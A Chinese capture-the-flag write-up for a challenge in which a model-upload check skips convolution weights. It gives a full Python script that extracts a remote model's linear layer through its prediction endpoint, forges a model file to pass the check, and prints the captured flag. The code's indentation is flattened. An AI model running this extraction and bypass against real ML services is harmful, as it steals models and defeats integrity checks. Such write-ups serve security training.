# SUCTF2026-theif

## 题目简述
题目给出远程模型服务源码，`README.md` 说明 `app.py` 是服务代码，线上模型由 `model_base.pth` 迁移学习得到。`/predict` 暴露完整输出，`/flag` 使用 `torch.load(..., weights_only=True)` 加载用户模型并逐参数比较。关键漏洞是比较逻辑覆盖了线性层和 bias，但没有有效校验四维卷积权重，因此可以围绕真实输出行为恢复或伪造能通过校验的参数。

## 解题过程
代码审计

题目的关键逻辑在题目附件 `app.py`：

```python
model.load_state_dict(torch.load('/app/model.pth', weights_only=True,
map_location=device))
```

这里用了 weights_only=True ，所以常见的 pickle 反序列化 RCE 方向基本走不通，重点要看业
务逻辑本身。

/predict 接口会把我们给的 image 直接送进远程模型，返回完整的 256 维输出：

```python
tensor_back = torch.tensor(image_data).to(device)
with torch.no_grad():
outputs = model(tensor_back)
return jsonify({'prediction': outputs.tolist()})
```

/flag 接口会加载我们上传的模型，然后逐层比较参数：

```python
for i, (param, user_param) in enumerate(zip(model.parameters(),
user_model.parameters())):
if param.dim() == 2:
if torch.any(~(abs(param - user_param) <= threshold_weight)):
return jsonify({'error': f'Layer weight difference too large at
layer {i}'}), 400
elif param.dim() == 1:
if torch.any(~(abs(param - user_param) <= threshold_bias)):
return jsonify({'error': f'Layer bias difference too large at
layer {i}'}), 400
```

这里有一个明显漏洞：

- 二维参数会被检查，也就是 linear.weight

- 一维参数会被检查，也就是 linear.bias 、conv.bias 、conv1.bias

- 四维参数完全没检查，也就是 conv.weight 和 conv1.weight

虽然卷积核没检查，但题目并不能直接任意造模型，因为线性层和 bias 还是要足够接近远程真实模
型。

模型结构分析

模型如下：

```python
class Net(nn.Module):
def __init__(self):
super(Net, self).__init__()
self.linear = nn.Linear(256, 256)
self.conv = nn.Conv2d(1, 1, (3, 3), stride=1)
self.conv1 = nn.Conv2d(1, 1, (2, 2), stride=2)
```

前向过程：

1. 输入先做左上 padding

2. 经过一次 3x3 卷积

3. 再经过一次 2x2 stride=2 卷积

4. 拉平成 256 维

5. 进入 Linear(256, 256)

整个网络里没有激活函数，所以它本质上是一个仿射变换：

```
y = W z + b
```

其中：

是卷积部分输出的 256 维特征• z
- W 是远程线性层权重
- b 是远程线性层偏置

利用思路

附件给了 model_base.pth ，我们可以直接解析出基础模型的卷积参数。实测发现远程服务的
bias 与附件模型保持一致到足以通过阈值，所以只需要恢复远程的 linear.weight 和
linear.bias 。

具体做法：

1. 用附件中的卷积参数，在本地实现卷积部分，得到 z = feature(image) 。

2. 构造 256 张线性无关的查询图片，使得对应的特征矩阵 Z 可逆。

3. 分别调用远程 /predict ，拿到每张图的输出 y_i 。

4. 再查询一次全零图，得到基线输出 y_0 ，本地也能得到基线特征 z_0 。

5. 对每张查询图做差分：

```
Y = [y_1 - y_0, ..., y_256 - y_0]
Z = [z_1 - z_0, ..., z_256 - z_0]
```

因为：

```
y_i - y_0 = W (z_i - z_0)
```

所以：

```
W = Y Z^{-1}
b = y_0 - W z_0
```

最后把恢复出来的 linear.weight 和 linear.bias 写回 model_base.pth 对应位置，生
成新的 .pth 文件上传到 /flag 即可。

为什么能成

这题的关键是两个点：

1. /predict 暴露了完整输出向量，不是只给分类标签。

2. 网络没有激活函数，所以它对输入是线性的，能直接通过线性代数把参数解出来。

如果中间有 ReLU 、Sigmoid 或输出只给类别编号，难度会高很多。

本地利用脚本

```python
import argparse
import base64
import json
import struct
import urllib.error
import urllib.request
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import numpy as np

DEFAULT_URL = "http://<target>:10003"

def load_storage(zip_file: zipfile.ZipFile, index: int) -> np.ndarray:
suffix = f"data/{index}"
matches = [name for name in zip_file.namelist() if name.endswith(suffix)]
if len(matches) != 1:
raise ValueError(f"unable to locate unique storage for {suffix}")
data = zip_file.read(matches[0])
return np.frombuffer(data, dtype="<f4").astype(np.float64)

def load_base_model(model_path: Path) -> dict[str, np.ndarray | float]:
with zipfile.ZipFile(model_path) as zf:
return {
"conv_weight": load_storage(zf, 2).reshape(3, 3),
"conv_bias": float(load_storage(zf, 3)[0]),
"conv1_weight": load_storage(zf, 4).reshape(2, 2),
"conv1_bias": float(load_storage(zf, 5)[0]),
}

def feature_vector(image: np.ndarray, model: dict[str, np.ndarray | float]) ->
np.ndarray:
conv_weight = model["conv_weight"]
conv_bias = model["conv_bias"]
conv1_weight = model["conv1_weight"]
conv1_bias = model["conv1_bias"]

padded = np.pad(image, ((2, 0), (2, 0)), mode="constant")
conv = np.empty((32, 32), dtype=np.float64)
for row in range(32):
for col in range(32):
window = padded[row : row + 3, col : col + 3]
conv[row, col] = float(np.sum(window * conv_weight) + conv_bias)

conv1 = np.empty((16, 16), dtype=np.float64)
for row in range(16):
for col in range(16):
window = conv[row * 2 : row * 2 + 2, col * 2 : col * 2 + 2]
conv1[row, col] = float(np.sum(window * conv1_weight) + conv1_bias)

return conv1.reshape(-1)

def build_query_set(model: dict[str, np.ndarray | float], seed: int,
max_attempts: int = 32) -> tuple[np.ndarray, np.ndarray, np.ndarray]:
rng = np.random.default_rng(seed)
base_feature = feature_vector(np.zeros((32, 32), dtype=np.float64), model)
for attempt in range(max_attempts):
images = rng.integers(-2, 3, size=(256, 32, 32)).astype(np.float64)
shifted = np.stack([feature_vector(image, model) - base_feature for
image in images], axis=1)
if np.linalg.matrix_rank(shifted) == 256:
print(f"[+] found invertible query set at attempt {attempt}")
return images, shifted, base_feature
raise RuntimeError("failed to build an invertible 256-image query set")

def post_json(url: str, payload: dict, timeout: int = 30) -> dict:
request = urllib.request.Request(

url,
data=json.dumps(payload).encode(),
headers={"Content-Type": "application/json"},
)
try:
with urllib.request.urlopen(request, timeout=timeout) as response:
return json.loads(response.read().decode())
except urllib.error.HTTPError as exc:
body = exc.read().decode()
try:
return json.loads(body)
except json.JSONDecodeError as err:
raise RuntimeError(body) from err

def query_prediction(base_url: str, image: np.ndarray) -> np.ndarray:
response = post_json(f"{base_url.rstrip('/')}/predict", {"image":
image.tolist()})
if "prediction" not in response:
raise RuntimeError(response.get("error", "predict endpoint returned no
prediction"))
return np.array(response["prediction"], dtype=np.float64)

def collect_remote_outputs(base_url: str, images: np.ndarray, workers: int) ->
tuple[np.ndarray, np.ndarray]:
zero_image = np.zeros((1, 32, 32), dtype=np.float64)
baseline = query_prediction(base_url, zero_image)
outputs = np.empty((256, 256), dtype=np.float64)

def task(index: int) -> tuple[int, np.ndarray]:
prediction = query_prediction(base_url, images[index][None, :, :])
return index, prediction

with ThreadPoolExecutor(max_workers=workers) as executor:
futures = [executor.submit(task, index) for index in range(256)]
finished = 0
for future in as_completed(futures):
index, prediction = future.result()
outputs[:, index] = prediction - baseline
finished += 1
if finished % 32 == 0:
print(f"[+] collected {finished}/256 remote predictions")

return baseline, outputs

def recover_linear_layer(shifted_features: np.ndarray, baseline_feature:
np.ndarray, baseline_output: np.ndarray, outputs: np.ndarray) ->
tuple[np.ndarray, np.ndarray]:

weights = np.linalg.solve(shifted_features.T, outputs.T).T
bias = baseline_output - weights @ baseline_feature
return weights.astype(np.float32), bias.astype(np.float32)

def write_candidate_model(base_model_path: Path, output_path: Path,
linear_weight: np.ndarray, linear_bias: np.ndarray) -> None:
linear_weight_bytes = linear_weight.astype("<f4",
copy=False).reshape(-1).tobytes()
linear_bias_bytes = linear_bias.astype("<f4",
copy=False).reshape(-1).tobytes()

with zipfile.ZipFile(base_model_path, "r") as source,
zipfile.ZipFile(output_path, "w", compression=zipfile.ZIP_STORED) as target:
for info in source.infolist():
data = source.read(info.filename)
if info.filename.endswith("data/0"):
data = linear_weight_bytes
elif info.filename.endswith("data/1"):
data = linear_bias_bytes
target.writestr(info, data)

def submit_candidate(base_url: str, model_path: Path) -> dict:
payload = {"model": base64.b64encode(model_path.read_bytes()).decode()}
return post_json(f"{base_url.rstrip('/')}/flag", payload)

def main() -> None:
parser = argparse.ArgumentParser(description="Recover the remote linear
layer and submit a valid model.")
parser.add_argument("--url", default=DEFAULT_URL, help="challenge base
url")
parser.add_argument("--model", default="model_base.pth", help="path to the
provided base model")
parser.add_argument("--output", default="candidate_recovered.pth",
help="path to write the reconstructed model")
parser.add_argument("--seed", type=int, default=12345, help="rng seed used
to build the query set")
parser.add_argument("--workers", type=int, default=16, help="concurrent
/predict requests")
args = parser.parse_args()

model_path = Path(args.model).resolve()
output_path = Path(args.output).resolve()

if not model_path.exists():
raise FileNotFoundError(f"base model not found: {model_path}")

print(f"[+] loading {model_path.name}")

base_model = load_base_model(model_path)

print("[+] building local full-rank query set")
images, shifted_features, baseline_feature = build_query_set(base_model,
args.seed)

print("[+] querying remote model")
baseline_output, outputs = collect_remote_outputs(args.url, images,
args.workers)

print("[+] recovering linear.weight and linear.bias")
linear_weight, linear_bias = recover_linear_layer(
shifted_features,
baseline_feature,
baseline_output,
outputs,
)

print(f"[+] writing {output_path.name}")
write_candidate_model(model_path, output_path, linear_weight, linear_bias)

print("[+] submitting candidate model")
response = submit_candidate(args.url, output_path)
print(json.dumps(response, ensure_ascii=False, indent=2))

if __name__ == "__main__":
main()
```

最终结果

最终拿到的 flag 为：

```
SUCTF{n0t_4ll_h1st0ry_t3lls_th3_truth_6a4e2b8d}
```

## 方法总结
- 核心技巧：模型上传校验缺口利用
- 识别信号：存在模型上传接口和逐层参数比较，但比较规则遗漏了某类权重。
- 复用要点：先排除 `weights_only=True` 下的常规反序列化，转向业务逻辑；结合 `/predict` 输出恢复必要层，利用未校验卷积参数完成伪造。
